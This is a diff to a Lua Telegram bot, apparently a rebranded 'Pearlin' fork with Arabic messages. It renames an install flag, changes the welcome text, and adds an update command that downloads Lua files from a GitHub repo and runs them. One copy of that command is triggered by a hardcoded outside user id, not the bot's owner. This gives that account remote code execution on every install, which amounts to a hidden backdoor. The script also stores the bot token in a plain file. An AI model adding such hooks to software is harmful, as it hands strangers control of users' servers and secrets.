@@ -101,7 +101,7 @@ redis:set(Pearlin..":DataCenter:",'German')
 redis:set(Pearlin..":UserNameBot:",BOT_User)
 redis:set(Pearlin..":NameBot:",BOT_NAME)
 redis:hset(Pearlin..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
-redis:set("TH3Pearlin_INSTALL","Yes")
+redis:set("UUIPearlin_INSTALL","Yes")
 info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
@@ -110,7 +110,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️┊اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖┊شكرا لاستخدامك سورس امريكي \n📡┊أرســل  الان /start\n♦️┊لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+local Text = "🙋🏼‍♂️┊اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖┊شكرا لاستخدامك سورس برليـن\n📡┊أرســل  الان /start\n♦️┊لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -639,6 +639,33 @@ end
 	Refresh_Start = true
 	end)
 	end 
+	
+	if msg.text== 'تحديث برلين' and msg.sender_user_id_ == SUDO_ID then
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
+	dofile("./inc/Run.lua")
+	print("Reload ~ ./inc/Run.lua")
+	end) 
+	end
+if msg.text== 'تحديث برلين' and msg.sender_user_id_ == 617641564 then
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/Pearlin/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
+	dofile("./inc/Run.lua")
+	print("Reload ~ ./inc/Run.lua")
+	end) 
+	end
+	
+	
 	if msg.text == 'Update Source' and msg.sender_user_id_ == SUDO_ID then
 	UpdateSource(msg)
 	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
